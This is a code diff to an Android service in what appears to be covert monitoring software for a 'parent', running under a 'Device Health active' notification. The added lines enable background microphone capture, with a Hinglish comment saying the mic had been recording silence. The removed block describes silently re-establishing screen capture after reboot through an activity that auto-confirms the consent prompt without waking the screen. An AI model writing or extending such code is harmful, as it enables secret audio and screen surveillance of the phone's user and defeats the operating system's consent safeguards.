@@ -14,6 +14,7 @@ import android.content.pm.ServiceInfo
 import android.net.ConnectivityManager
 import android.net.Network
 import android.os.BatteryManager
+import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
@@ -50,11 +51,6 @@ class MainService : Service() {
         /** Last statusLoop tick (elapsedRealtime); lets others detect a wedged service. */
         @Volatile
         var lastBeat: Long = 0L
-
-        /** Once-per-process flag for the quiet projection re-establish attempt
-         *  (after reboot / app update) — never repeated while this process lives. */
-        @Volatile
-        var bootConsentTried: Boolean = false
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -67,6 +63,14 @@ class MainService : Service() {
         var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
             types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+        }
+        // MIC FIX: Android 11+ par background me mic access sirf tab milta hai jab
+        // FGS ka type "microphone" ho — bina iske AudioRecord chupchap SILENCE
+        // deta tha ("mic bhi ni kaam karra"). API 30+ par hi bit pass karte hain.
+        if (Build.VERSION.SDK_INT >= 30 &&
+            ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        ) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
         }
         val notif = buildNotif("Device Health active")
         runCatching {
@@ -102,22 +106,6 @@ class MainService : Service() {
             }
             cm.registerDefaultNetworkCallback(cb)
             netCb = cb
-        }
-
-        // One-shot per boot/process: quietly re-establish the screen-capture session
-        // (ConsentActivity auto-confirms it without waking the screen). This is what
-        // keeps mirroring popup-free for the parent even after a reboot — by the
-        // time they tap Start, the session is already warm and frames flow instantly.
-        if (!bootConsentTried) {
-            bootConsentTried = true
-            scope.launch {
-                delay(20_000) // let the system settle after boot before touching windows
-                runCatching {
-                    if (Store.paired && !Store.released && !MirrorManager.hasProjection) {
-                        CommandHandler.requestProjectionConsent(applicationContext, quiet = true)
-                    }
-                }
-            }
         }
 
         scope.launch {
